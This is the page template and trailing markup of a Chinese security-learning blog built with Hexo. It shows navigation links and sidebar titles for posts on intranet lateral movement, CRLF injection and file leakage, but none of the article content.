+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">HVVL404</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/66-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&amp;schtasks&amp;impacket/">http://example.com/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/66-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%89%B9%E9%87%8Fat&amp;schtasks&amp;impacket/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">HVVL404</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/67-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91smb&amp;wmi%E6%98%8E%E6%96%87%E6%88%96hash%E4%BC%A0%E9%80%92/" title="67-内网安全-域横向smb&amp;wmi明文或hash传递"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">67-内网安全-域横向smb&amp;wmi明文或hash传递</div></div></a></div><div class="next-post pull-right"><a href="/2023/04/29/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="汇编语言学习笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">汇编语言学习笔记</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">HVVL404</div><div class="author-info__description">欢迎来到我的博客</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/17/Web%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/" title="文件泄露">文件泄露</a><time datetime="2023-05-17T10:08:14.108Z" title="发表于 2023-05-17 18:08:14">2023-05-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/12/Web%E6%BC%8F%E6%B4%9E/CRLF%E6%B3%A8%E5%85%A5/" title="CRLF注入">CRLF注入</a><time datetime="2023-05-12T14:23:23.978Z" title="发表于 2023-05-12 22:23:23">2023-05-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/12/Python/14_Python%E7%88%AC%E8%99%AB_%E8%A7%A3%E6%9E%90/" title="Python爬虫-解析">Python爬虫-解析</a><time datetime="2023-05-12T13:03:55.780Z" title="发表于 2023-05-12 21:03:55">2023-05-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/12/Web%E6%BC%8F%E6%B4%9E/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="无题">无题</a><time datetime="2023-05-12T12:29:54.596Z" title="发表于 2023-05-12 20:29:54">2023-05-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/12/Web%E6%BC%8F%E6%B4%9E/%E7%88%86%E7%A0%B4/" title="无题">无题</a><time datetime="2023-05-12T12:29:41.413Z" title="发表于 2023-05-12 20:29:41">2023-05-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023.4.27 - 2023 By HVVL404</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="http://blog.hvvl404.fun">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
